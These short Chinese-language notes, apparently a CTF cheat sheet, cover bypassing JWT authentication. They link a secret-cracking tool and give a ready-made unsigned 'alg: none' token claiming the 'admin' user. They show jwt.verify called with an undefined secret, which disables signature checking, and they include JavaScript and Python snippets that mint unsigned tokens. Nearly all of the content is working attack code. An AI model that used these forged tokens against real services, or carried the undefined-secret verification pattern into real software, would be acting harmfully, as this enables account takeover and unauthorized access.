- [破解工具](https://github.com/brendan-rius/c-jwt-cracker)
- 可以简单理解为签名后的对象
-
- 不知道 secret，可以通过传入一个 undefined 来关闭验证功能。
	- ```javascript
	  const evil_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6W10sInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IjEyMyIsImlhdCI6MTY0NzMzNDY5OH0."
	  const result = jwt.verify(
	  evil_jwt,   // 不包含签名的自定义jwt
	  undefined,  // secret
	  "HS256"     //受害者指定的加密算法
	  );
	  ```
- 也可以通过将签名算法设置为none直接通过
	- ```js
	  const jwt = require('jsonwebtoken');
	  global.secrets = [];
	  var user = {
	      secretid: [],
	      username: '114514',
	      password: '114514',
	      iat: 1693146076
	  }
	  const secret = global.secrets[user.secretid];
	  var token = jwt.sign(user, secret, { algorithm: 'none' });
	  console.log(token);
	  
	  ```
	- ```python
	  import jwt
	  
	  header = {
	      "alg": "none",
	      "typ": "JWT"
	  }
	  
	  payload = {
	      "sub": "user123",
	      "exp": 1624632000  # 设置过期时间
	  }
	  
	  jwt_token = jwt.encode(payload, "", algorithm="none", headers=header)
	  print(jwt_token)
	  ```